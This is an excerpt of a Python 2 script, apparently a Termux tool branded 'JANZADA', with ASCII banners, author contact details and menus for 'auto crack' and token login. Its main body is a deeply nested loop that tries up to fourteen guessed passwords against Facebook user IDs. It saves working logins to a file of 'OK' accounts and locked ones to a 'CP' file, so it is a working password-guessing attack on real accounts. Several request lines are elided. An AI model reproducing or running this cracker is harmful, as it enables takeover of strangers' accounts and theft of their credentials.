...
\033[1;92m        #  #  # #   # #### #  # ###  #  #
\033[1;91m  ______________________________________________
\033[1;95m  AUTHOR   :     \033[1;93mJANZADA X OSCAR ALEX    
\033[1;95m  WHATSAPP :     \033[1;92m03099006070
\033[1;95m  FACEBOOK :     \033[1;92mJANZADA KHAN 

\033[1;92m  SHAKH SE JU GIR JAEN HAM WO PATY NAI
\033[1;92m  AANDHION SE KEH DO APNI OQAT MAI RAHEN 
\033[1;91m  ______________________________________________
"""
def tik():
	titik = ['.   ','..  ','... ']
...
\033[1;92m  #  #  # #   # #### #  # ###  #  #
\033[1;91m  ______________________________________________
\033[1;95m  AUTHOR   :     \033[1;93mOSCAR ALEX X JANZADA    
\033[1;95m  WHATSAPP :     \033[1;92m03099006070
\033[1;95m  SHAKH SE JU GIR JAEN HAM WO PATY NAI
\033[1;95m  AANDHION SE KEH DO APNI OQAT MAI RAHEN 
\033[1;91m  _______________________________________________
"""
jalan("\033[1;91m _____________________________________________")     

jalan("\033[1;95m              THE JANZADA BRAND")                   
jalan("\033[1;91m _____________________________________________")
 
jalan("\033[1;93m WELCOME TO JANZADA WORLD ")	
...
def reg2():
    ...
    os.system('xdg-open https://wa.me/03099006070')
...
def log_menu_s():
    s = raw_input(' \x1b[1;95m\xe2\x95\xb0\xe2\x94\x80janzada\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('\x1b[1;95m\xe2\x95\xb0\xe2\x94\x80janzada\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;95m\xe2\x95\xb0\xe2\x94\x80janzada\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;95m     THE JANZADA BRAND \x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1mJANZADA-CP] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass2
                    cp = open('JANZADA_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass3
                        cp = open('JANZADA_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass4
                            cp = open('JANZADA_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass5
                                cp = open('JANZADA_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass6
                                    cp = open('JANZADA_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass7
                                        cp = open('JANZADA_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass8
                                            cp = open('JANZADA_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/JANZADA.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass9
                                                cp = open('JANZADA_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass10
                                                    cp = open('JANZADA_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    ...
                                                    q = json.loads(data)
                                                    if 'loc' in q:
                                                        print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass11 + '\x1b[0;97m'
                                                        ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                                        ok.write(uid + ' | ' + pass11 + '\n')
                                                        ok.close()
                                                        oks.append(uid + pass11)
                                                    elif 'www.facebook.com' in q['error']:
                                                        print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass11
                                                        cp = open('JANZADA_CP.txt', 'a')
                                                        cp.write(uid + ' | ' + pass11 + '\n')
                                                        cp.close()
                                                        ...
                                                        q = json.loads(data)
                                                        if 'loc' in q:
                                                            print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass12 + '\x1b[0;97m'
                                                            ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                                            ok.write(uid + ' | ' + pass12 + '\n')
                                                            ok.close()
                                                            oks.append(uid + pass12)
                                                        elif 'www.facebook.com' in q['error']:
                                                            print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass12
                                                            cp = open('JANZADA_CP.txt', 'a')
                                                            cp.write(uid + ' | ' + pass12 + '\n')
                                                            cp.close()
                                                            ...
                                                            q = json.loads(data)
                                                            if 'loc' in q:
                                                                print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass13 + '\x1b[0;97m'
                                                                ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                                                ok.write(uid + ' | ' + pass13 + '\n')
                                                                ok.close()
                                                                oks.append(uid + pass13)
                                                            elif 'www.facebook.com' in q['error']:
                                                                print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass13
                                                                cp = open('JANZADA_CP.txt', 'a')
                                                                cp.write(uid + ' | ' + pass13 + '\n')
                                                                cp.close()
							        ...
							        pass14 = '500600'
                                                                ...
                                                                q = json.loads(data)
                                                                if 'loc' in q:
                                                                    print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass14 + '\x1b[0;97m'
                                                                    ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
                                                                    ok.write(uid + ' | ' + pass14 + '\n')
                                                                    ok.close()
                                                                    oks.append(uid + pass14)
                                                                elif 'www.facebook.com' in q['error']:
                                                                    print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass14
                                                                    cp = open('JANZADA_CP.txt', 'a')
                                                                    cp.write(uid + ' | ' + pass14 + '\n')
                                                                    cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass1
                cp = open('JANZADA_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
...
def n_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80JANZADA\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94m OSCAR X JANZADA THE NAME THE BRAND \x1b[1;91m'
    print 47 * '-'
